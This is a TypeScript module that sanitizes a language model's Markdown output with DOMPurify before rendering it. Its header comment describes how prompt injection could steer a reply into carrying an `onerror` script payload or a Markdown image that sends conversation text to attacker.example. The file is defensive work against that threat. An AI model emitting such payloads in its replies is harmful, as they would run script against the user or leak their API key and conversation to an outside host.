// Renders model output as HTML — sanitized, because model output is untrusted.
//
// A reply can be steered by prompt injection. Unsanitized, `<img src=x onerror=…>`
// would run script on the origin that holds the API key in localStorage
// (ADR-0001). Images are also forbidden outright: a Markdown image loads
// automatically, so `![](https://attacker.example/?q=<conversation text>)` would
// leak conversation content with no click at all. Links stay, opening in a new
// tab, because following one is a deliberate user act.

import DOMPurify from 'dompurify'
import { marked } from 'marked'

let hooked = false

function ensureHook(): void {
  if (hooked) return
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (node.tagName === 'A') {
      node.setAttribute('target', '_blank')
      node.setAttribute('rel', 'noopener noreferrer')
    }
  })
  hooked = true
}

export function renderMarkdown(src: string): string {
  ensureHook()
  const html = marked.parse(src, { async: false, gfm: true, breaks: true })
  return DOMPurify.sanitize(html, {
    USE_PROFILES: { html: true },
    FORBID_TAGS: ['img', 'picture', 'source', 'video', 'audio', 'iframe', 'object', 'embed', 'form', 'input', 'button', 'style', 'link', 'meta', 'base'],
    FORBID_ATTR: ['style', 'srcset', 'background', 'poster'],
  })
}
